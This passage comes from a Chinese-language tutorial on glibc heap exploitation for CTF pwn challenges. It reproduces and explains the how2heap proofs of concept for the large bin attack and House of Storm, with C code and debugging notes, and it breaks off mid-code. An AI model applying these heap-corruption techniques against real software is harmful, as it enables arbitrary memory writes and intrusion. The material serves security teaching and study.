                ><br>堆由低地址向高地址增长，我们此时申请<code>0x68</code>大小的堆块时，<code>top_chunk=0x602070+0x68+0x8=0x6020e0</code>，成功将目标地址放入新申请堆块的<code>fd</code>指针处。</p>
<h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h2><p><code>glibc-2.29</code> 之前的 <code>large_bin_attack</code> 可以修改两个值。</p>
<h3 id="源码-12"><a href="#源码-12" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    This technique is taken from</span></span><br><span class="line"><span class="comment">    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">              else</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                  victim-&gt;fd_nextsize = fwd;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">                  fwd-&gt;bk_nextsize = victim;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">              bck = fwd-&gt;bk;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    mark_bin (av, victim_index);</span></span><br><span class="line"><span class="comment">    victim-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">    victim-&gt;fd = fwd;</span></span><br><span class="line"><span class="comment">    fwd-&gt;bk = victim;</span></span><br><span class="line"><span class="comment">    bck-&gt;fd = victim;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    For more details on how large-bins are handled and sorted by ptmalloc,</span></span><br><span class="line"><span class="comment">    please check the Background section in the aforementioned link.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p2 - <span class="number">2</span>), (<span class="type">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">            <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">            <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">            <span class="string">&quot; [ %p ]\n\n&quot;</span>, (<span class="type">void</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p3 - <span class="number">2</span>), (<span class="type">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">            <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">            <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">            <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">            <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    <span class="built_in">assert</span>(stack_var1 != <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">assert</span>(stack_var2 != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>large bin 结构图。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VFQNFY7QR4V8CRG-1695379768564-24.webp"
                      alt="图片描述"
                ></p>
<ol>
<li>大于 0x400 的 chunk 属于 large bin 范畴。</li>
<li>fd -&gt; 后一个大小相同的 chunk，bk 指向前一个大小相同的 chunk。</li>
<li>fd_nextsize -&gt; 比他小的最大heap。</li>
<li>bk_nextsize -&gt; 比他大的最小的heap。</li>
<li>最后将两条链条首尾相连。</li>
</ol>
<h3 id="调试-12"><a href="#调试-12" class="headerlink" title="调试"></a>调试</h3><p>首先栈上放置两个值为 0 的栈变量。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_B9PMX7Y6BUNXX68-1695379746623-20.webp"
                      alt="图片描述"
                ><br>然后布置如下结构的堆。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_NTGAR62F4NUUEPD-1695379792691-27.webp"
                      alt="图片描述"
                ><br>依次释放 non-fast 大小的 p1, p2，它们将会被挂到 unsorted bin 。并且 p2-&gt;p1 。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PH5MQPBFFHH6UWF-1695379744185-16.webp"
                      alt="图片描述"
                ><br>此时申请 0x90 大小的堆块将会遍历 unsorted bin , 但 unsorted bin 中并无正好合适的 chunk 。所以会切割先进来的 p1 成为 last_remainder 留在 unsorted bin，并把 p2 放进 large bin 。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KMUDJ58864BVGRJ-1695379733565-12.webp"
                      alt="图片描述"
                ><br>之后 free(p3)，p3 进入 unsorted bin , p3-&gt;p1。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7R56GD8898CAHVC-1695379732363-10.webp"
                      alt="图片描述"
                ><br>然后如下修改 p2 的结构，让 p3_size &gt; p2_size ，以便后续利用。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_C845XWYM8RY6FP2-1695379729718-6.webp"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_FSXFTBKCRMVYT59-1695379728616-4.webp"
                      alt="图片描述"
                ><br>此时 p2 结构如下。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_NWAPT4CW7S4UWB8-1695379724638-1.webp"
                      alt="图片描述"
                ><br>再次申请 0x90 大小的堆块，将会再次遍历 unsorted bin 。将 p1 切割，将 p3 放进 unsorted bin 。<br>放入过程中如果 p3_size &gt; p2_size 。将会执行如下代码:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 源码 */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;    </span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line"><span class="comment">/* “译”码 */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    P3-&gt;fd_nextsize = P2;</span><br><span class="line">    P3-&gt;bk_nextsize = P2-&gt;bk_nextsize; </span><br><span class="line">    P2-&gt;bk_nextsize = P3;</span><br><span class="line">    P3-&gt;bk_nextsize-&gt;fd_nextsize = P3; </span><br><span class="line">&#125;</span><br><span class="line">bck = P2-&gt;bk;</span><br></pre></td></tr></table></figure></div>
<p>即 stack_var2 &#x3D; p3。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 源码 */</span></span><br><span class="line"><span class="built_in">mark_bin</span> (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line"><span class="comment">/* “译”码 */</span></span><br><span class="line"><span class="built_in">mark_bin</span>(av, victim_index);</span><br><span class="line">P3-&gt;bk = p2-&gt;bk;</span><br><span class="line">P3-&gt;fd = P2;</span><br><span class="line">P2-&gt;bk = P3;</span><br><span class="line">bck-&gt;fd = P3; <span class="comment">// bck 是原p2-&gt;bk(见上一段代码的bck)</span></span><br></pre></td></tr></table></figure></div>
<p>即 stack_var1 &#x3D; p3，至此利用完成，具体如何利用可看例题。</p>
<h2 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h2><p><code>glibc &lt; 2.29</code>，例题 <code>heap2storm</code> 结合 <code>ptmalloc</code> 源码讲的更为详细一些，这里简化了很多。</p>
<h3 id="源码-13"><a href="#源码-13" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC for House of Storm on 2.23</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">For 2.26-2.28, the tcache will need to</span></span><br><span class="line"><span class="comment">be full for this to work. After this,</span></span><br><span class="line"><span class="comment">a patch to the unsorted bin attack likely prevents this</span></span><br><span class="line"><span class="comment">technique from working.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This technique uses a combination of editing</span></span><br><span class="line"><span class="comment">the unsorted bin chunk and the large bin chunks</span></span><br><span class="line"><span class="comment">to write a &#x27;size&#x27; to a user choosen address in memory.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Once this has occurred, if the size at this &#x27;fake&#x27;</span></span><br><span class="line"><span class="comment">location is the same size as the allocation,</span></span><br><span class="line"><span class="comment">then the chunk will be returned back to the user.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This attack allows arbitrary chunks to be returned</span></span><br><span class="line"><span class="comment">to the user!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Written by Maxwell &quot;Strikeout&quot; Dulin</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> filler[<span class="number">0x10</span>];</span><br><span class="line"><span class="type">char</span> target[<span class="number">0x60</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// clearenv();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the AMOUNT to shift over for size and the offset on the largebin.</span></span><br><span class="line"><span class="comment">// Needs to be a valid minimum sized chunk in order to work.</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_shift_amount</span><span class="params">(<span class="type">char</span>* pointer)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> shift_amount = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ptr = (<span class="type">long</span> <span class="type">long</span>)pointer;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(ptr &gt; <span class="number">0x20</span>)&#123;</span><br><span class="line">                ptr = ptr &gt;&gt; <span class="number">8</span>;</span><br><span class="line">                shift_amount += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> shift_amount - <span class="number">1</span>; <span class="comment">// Want amount PRIOR to this being zeroed out</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> *unsorted_bin, *large_bin, *fake_chunk, *ptr;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;House of Storm&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Preparing chunks for the exploit&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Put one chunk into unsorted bin and the other into the large bin&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The unsorted bin chunk MUST be larger than the large bin chunk.&quot;</span>);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Putting a chunk into the unsorted bin and another</span></span><br><span class="line"><span class="comment">	into the large bin.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	unsorted_bin = <span class="built_in">malloc</span> ( <span class="number">0x4e8</span> );  <span class="comment">// size 0x4f0</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// prevent merging</span></span><br><span class="line">	<span class="built_in">malloc</span> ( <span class="number">0x18</span> );</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Find the proper chunk size to allocate.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Must be exactly the size of the written chunk from above.&quot;</span>);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Find the proper size to allocate</span></span><br><span class="line"><span class="comment">	We are using the first &#x27;X&#x27; bytes of the heap to act</span></span><br><span class="line"><span class="comment">	as the &#x27;size&#x27; of a chunk. Then, we need to allocate a</span></span><br><span class="line"><span class="comment">	chunk exactly this size for the attack to work.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	So, in order to do this, we have to take the higher</span></span><br><span class="line"><span class="comment">	bits of the heap address and allocate a chunk of this</span></span><br><span class="line"><span class="comment">	size, which comes from the upper bytes of the heap address.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	<span class="doctag">NOTE:</span></span></span><br><span class="line"><span class="comment">	- This does have a 1/2 chance of failing. If the 4th bit</span></span><br><span class="line"><span class="comment">	of this value is set, then the size comparison will fail.</span></span><br><span class="line"><span class="comment">	- Without this calculation, this COULD be brute forced.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="type">int</span> shift_amount = <span class="built_in">get_shift_amount</span>(unsorted_bin);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Shift Amount: %d\n&quot;</span>, shift_amount);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> alloc_size = ((<span class="type">size_t</span>)unsorted_bin) &gt;&gt; (<span class="number">8</span> * shift_amount);</span><br><span class="line">        <span class="keyword">if</span>(alloc_size &lt; <span class="number">0x10</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Chunk Size: 0x%lx\n&quot;</span>, alloc_size);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Chunk size is too small&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        alloc_size = (alloc_size &amp; <span class="number">0xFFFFFFFFE</span>) - <span class="number">0x10</span>; <span class="comment">// Remove the size bits</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;In this case, the chunk size is 0x%lx\n&quot;</span>, alloc_size);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Checks to see if the program will crash or not</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        The fourth bit of the size and the &#x27;non-main arena&#x27; chunk can NOT be set. Otherwise, the chunk. So, we MUST check for this first. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Additionally, the code at https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438</span></span><br><span class="line"><span class="comment">        validates to see if ONE of the following cases is true:</span></span><br><span class="line"><span class="comment">        - av == arena_for_chunk (mem2chunk (mem))</span></span><br><span class="line"><span class="comment">        - chunk is mmaped</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        If the &#x27;non-main arena&#x27; bit is set on the chunk, then the</span></span><br><span class="line"><span class="comment">        first case will fail.</span></span><br><span class="line"><span class="comment">        If the mmap bit is set, then this will pass.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        So, either the arenas need to match up (our fake chunk is in the</span></span><br><span class="line"><span class="comment">        .bss section for this demo. So, clearly, this will not happen) OR</span></span><br><span class="line"><span class="comment">        the mmap bit must be set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        The logic below validates that the fourth bit of the size</span></span><br><span class="line"><span class="comment">        is NOT set and that either the mmap bit is set or the non-main</span></span><br><span class="line"><span class="comment">        arena bit is NOT set. If this is the case, the exploit should work.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span>((alloc_size &amp; <span class="number">0x8</span>) != <span class="number">0</span> || (((alloc_size &amp; <span class="number">0x4</span>) == <span class="number">0x4</span>) &amp;&amp; ((alloc_size &amp; <span class="number">0x2</span>) != <span class="number">0x2</span>)))&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Allocation size has bit 4 of the size set or &quot;</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;mmap and non-main arena bit check will fail&quot;</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Please try again! :)&quot;</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Exiting...&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	large_bin  =  <span class="built_in">malloc</span> ( <span class="number">0x4d8</span> );  <span class="comment">// size 0x4e0</span></span><br><span class="line">	<span class="comment">// prevent merging</span></span><br><span class="line">	<span class="built_in">malloc</span> ( <span class="number">0x18</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// FIFO</span></span><br><span class="line">	<span class="built_in">free</span> ( large_bin );  <span class="comment">// put small chunks first</span></span><br><span class="line">	<span class="built_in">free</span> ( unsorted_bin );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Put the &#x27;large bin&#x27; chunk into the large bin</span></span><br><span class="line">	unsorted_bin = <span class="built_in">malloc</span>(<span class="number">0x4e8</span>);</span><br><span class="line">	<span class="built_in">free</span>(unsorted_bin);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	At this point, there is a single chunk in the</span></span><br><span class="line"><span class="comment">	large bin and a single chunk in the unsorted bin.</span></span><br><span class="line"><span class="comment">	It should be noted that the unsorted bin chunk</span></span><br><span class="line"><span class="comment">	should be LARGER in size than the large bin chunk</span></span><br><span class="line"><span class="comment">	but should still be within the same bin.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	In this setup, the large_bin has a chunk</span></span><br><span class="line"><span class="comment">	of size 0x4e0 and the unsorted bin</span></span><br><span class="line"><span class="comment">	has a chunk of size 0x4f0. This technique relies on</span></span><br><span class="line"><span class="comment">	the unsorted bin chunk being added to the same bin</span></span><br><span class="line"><span class="comment">	but a larger chunk size. So, careful heap feng shui</span></span><br><span class="line"><span class="comment">	must be done.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// The address that we want to write to!</span></span><br><span class="line">	fake_chunk = target - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Vulnerability! Overwrite unsorted bins &#x27;bk&#x27; pointer with our target location.\n This is our target location to get from the allocator&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The address of our fake chunk is set to the unsorted bin</span></span><br><span class="line"><span class="comment">	chunks &#x27;bk&#x27; pointer.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This launches the &#x27;unsorted_bin&#x27; attack but it is NOT the</span></span><br><span class="line"><span class="comment">	main purpose of us doing this.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	After launching the &#x27;unsorted_bin attack&#x27; the &#x27;victim&#x27; pointer</span></span><br><span class="line"><span class="comment">	will be set to THIS address. Our goal is to find a way to get</span></span><br><span class="line"><span class="comment">	this address from the allocator.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Vulnerability!!</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	((<span class="type">size_t</span> *)unsorted_bin)[<span class="number">1</span>] = (<span class="type">size_t</span>)fake_chunk; <span class="comment">// unsorted_bin-&gt;bk</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Only needs to be a valid address.</span></span><br><span class="line">	(( <span class="type">size_t</span> *) large_bin )[<span class="number">1</span>]  =  (<span 